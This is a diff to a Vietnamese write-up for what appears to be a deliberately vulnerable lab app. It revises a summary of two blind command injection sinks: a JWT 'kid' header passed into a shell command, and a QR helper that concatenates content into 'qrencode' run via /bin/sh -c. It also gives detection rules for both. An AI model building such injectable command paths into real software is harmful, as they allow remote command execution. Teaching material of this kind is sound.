+| Chain nào vẫn chạm sink? | JWT verification | SSTI và Deserialize |
 
 ---
 
-## 8. Tổng kết
+## 9. Tổng kết
 
-Blind Command Injection trong WebLab nằm ở `QRCodeHelper`:
+Blind Command Injection hiện cần ghi nhận đủ 2 sink:
 
-1. `QRCodeHelper.renderQrCode(...)` ghép `resolvedContent` vào command `qrencode`;
-2. Command được chạy bằng `/bin/sh -c`;
-3. Profile QR đưa `email` vào helper qua Freemarker `memberQr(email)`;
-4. User có thể update email qua `PUT /api/v1/user` vì endpoint bind trực tiếp entity và không validate email bằng DTO;
-5. Booking QR cũng đi vào cùng sink, nhưng `promotionCode` thường phải là promotion hợp lệ trước khi QR được render;
-6. Response không trả stdout/stderr nên khai thác quan sát qua timing hoặc side effect.
+1. **Sink A - JWT `kid` injection:** `kid` trong JWT header đi vào `kidKeyCommandTemplate`, sau đó chạy bằng `/bin/sh -c`. Đây là Blind Command Injection chính vì có thể tạo side effect ngay trong quá trình token validation.
+2. **Sink B - `QRCodeHelper`:** `qrContent` đi vào command `qrencode` rồi chạy bằng `/bin/sh -c`. Sink này vẫn nguy hiểm nhưng hiện được giữ như hidden final sink cho SSTI và Deserialize; các source business như signup/update email và booking `promotionCode` thường đã được guard.
 
-Kết luận phát hiện:
+Kết luận phân loại:
 
 ```text
-Nếu attacker-controlled content được nối vào command string rồi chạy qua /bin/sh -c,
+Nếu attacker-controlled input được nối vào command string rồi chạy qua /bin/sh -c,
 đánh dấu Command Injection.
 
-Nếu response không chứa command output và chỉ quan sát được delay/file/OOB side effect,
+Nếu response không trả command output và chỉ quan sát được delay/file/OOB side effect,
 đánh dấu Blind Command Injection.
 ```
